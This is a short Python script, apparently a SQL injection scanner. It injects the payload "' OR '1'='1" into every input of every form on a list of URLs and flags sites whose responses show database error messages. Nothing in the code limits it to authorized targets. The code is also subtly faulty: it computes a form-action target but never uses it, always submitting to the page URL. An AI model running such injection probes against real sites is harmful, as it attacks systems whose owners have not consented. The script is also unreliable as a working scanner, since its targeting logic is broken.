import requests
from bs4 import BeautifulSoup

def scan_sql_injection(url_list):
    payload = "' OR '1'='1"
    vulnerable = []

    for url in url_list:
        try:
            res = requests.get(url)
            soup = BeautifulSoup(res.text, "html.parser")

            forms = soup.find_all("form")

            for form in forms:
                action = form.get("action")
                method = form.get("method", "get").lower()

                inputs = form.find_all("input")

                data = {}
                for inp in inputs:
                    name = inp.get("name")
                    if name:
                        data[name] = payload

                target = url if not action else url + action

                if method == "post":
                    response = requests.post(url, data=data)
                else:
                    response = requests.get(url, params=data)

                content = response.text.lower()

                if "sql syntax" in content or "database error" in content:
                    vulnerable.append(url)

        except Exception as e:
            print("Error scanning:", url)

    return vulnerable